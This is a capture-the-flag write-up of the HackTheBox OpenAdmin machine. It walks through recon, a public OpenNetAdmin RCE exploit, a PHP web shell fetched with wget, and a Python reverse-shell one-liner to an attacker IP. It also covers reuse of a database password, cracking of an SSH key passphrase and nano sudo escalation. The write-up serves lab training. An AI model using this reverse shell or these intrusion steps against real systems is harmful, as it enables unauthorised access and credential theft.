# HackTheBox-OpenAdmin

## NMAP

```bash
nmap -p- -sC -sV --min-rate 5000 IP

PORT      STATE    SERVICE      REASON         VERSION
22/tcp    open     ssh          syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                            
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VG
HiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNK
WaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2
tPAFPpvipRrLE=                                                            
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp    open     http         syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:        
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

## PORT 80 (HTTP)

On the web server we only get apache default web page

<img src="https://imgur.com/vwGCeXL.png"/>

I tried to see if it had something in `robots.txt` but that file didn't existed

<img src="https://i.imgur.com/9XYoLpE.png"/>

So I decide to run `gobuster` to fuzz for files and directories

<img src="https://i.imgur.com/g1L1Jh7.png"/>

Going to `music` we can see a html template page , there's login link which takes us to `OpenNetAdmin` page which is an application for managing IP addresses DNS , subnets and etc also it exposes the version of openetadmmin which is 18.1.1
 
<img src="https://imgur.com/fx43d5s.png"/>

On googling for any exploits which are there for version `18.1.1` we can see a github repo having the PoC of remote code execution

https://github.com/amriunix/ona-rce

<img src="https://imgur.com/iuerBVd.png"/>

We can check through poc if the target is vulnerable or not

<img src="https://imgur.com/YFCTOOY.png"/>

But when running the exploit it breaks

<img src="https://imgur.com/AqWfFcX.png"/>

So I went to `exploit-db` and try that exploit 

<img src="https://imgur.com/mGfdedH.png"/>

And this one worked perfectly

<img src="https://imgur.com/yU7UGrH.png"/>

I tried getting a reverse shell again so that I can stabilize it but it wasn't working

<img src="https://imgur.com/6Eu08gw.png"/>

I made a simple php file having a GET parameter named `cmd` which will be executed through `system` function which is used to execute shell commands and outputs the result , then I hosted this file using `python3`  and downloaded it on target machine using `wget`

<img src="https://imgur.com/PU830kN.png"/>

Using python3 reverse shell I was able to get a proper shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.84",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<img src="https://imgur.com/JVRj2jH.png"/>

Here I have just tried to stabilize the shell so we can have the ability to clear terminal screen also use bash history by using up  and arrow down keys

<img src="https://imgur.com/SDsKnDw.png"/>

We can go into `/home` directory to see how many users are there

<img src="https://imgur.com/iFr6hIm.png"/>

There are 2 users but we can't navigate into to folders as `www-data` doesn't have permissions to view them. We can look for any cronjobs running through `cat /etc/crontab`

<img src="https://imgur.com/U2Ndb0w.png"/>

Nothing there, next we can look for open ports 

<img src="https://imgur.com/EzHmwJX.png"/>

Here we can see port 3306 which is for database , we can try to view the database password and see if it works on either one of the users

<img src="https://imgur.com/iYeqsis.png"/>

In `/opt/ona/www/local/config` we can see a database settings file 

<img src="https://i.imgur.com/Ap0ARPD.png"/>

Let's try this password on `jimmy`

<img src="https://imgur.com/Y6Qr8BA.png"/>

Perfect this worked !

<img src="https://imgur.com/MnYRPAY.png"/>

But doing `sudo -l` failed the user was not allowed to use `sudo` I guess , so this user is in `internal` group maybe there's some folder we can look into

<img src="https://i.imgur.com/VQpCFrd.png"/>
So looking into `index.php` we can see it's a login page which requires username and password and there's a condition if we provide the username as `jimmy` or provide the correct password which we could just decrpyt the sha512 hash , on decrypting it is `Revealed`

<img src="https://i.imgur.com/BY6nype.png"/>

<img src="https://imgur.com/6X1fTV2.png/">

We can also see a php file `main.php` which is executing a shell command to read id_rsa key of `joanna` , if we try to run the php file we will get permission denied error as it's going to be executed as `jimmy`

<img src="https://i.imgur.com/64FfQYB.png"/>

<img src="https://imgur.com/W1zSPRJ.png"/>

If we look at the running ports on the machine we can see a port `52846`

<img src="https://i.imgur.com/NEANZr9.png"/>

Using `curl` we can make a request on that port and it seems this is the same page that we saw in `internal` directory so this directory is being hosted on port 52846 this means we can naviagte to `main.php` file

<img src="https://imgur.com/vErwU5H.png"/>

<img src="https://imgur.com/vI3vfw6.png"/>

I saved the request to `main.php` in a text file and transfered that file on my machine

<img src="https://imgur.com/sn5XuNF.png"/>

On using the private key , it asks for a passphrase

<img src="https://imgur.com/ec5kZQH.png"/>

Using `ssh2john` we can get the hash of id_rsa and crack it so we can  get the passphrase

<img src="https://imgur.com/OotJmQc.png"/>

<img src="https://imgur.com/Qmix1qH.png"/>

Now we have escalated to the second user , on running `sudo -l` we can see have permissions to run `nano` on `/opt/priv`

<img src="https://imgur.com/4AsPxoW.png"/>

We can check the how to abuse `nano` from GTFOBINS

https://gtfobins.github.io/gtfobins/nano/

<img src="https://imgur.com/hxghHsw.png"/>

<img src="https://imgur.com/kCYvgWE.png"/>
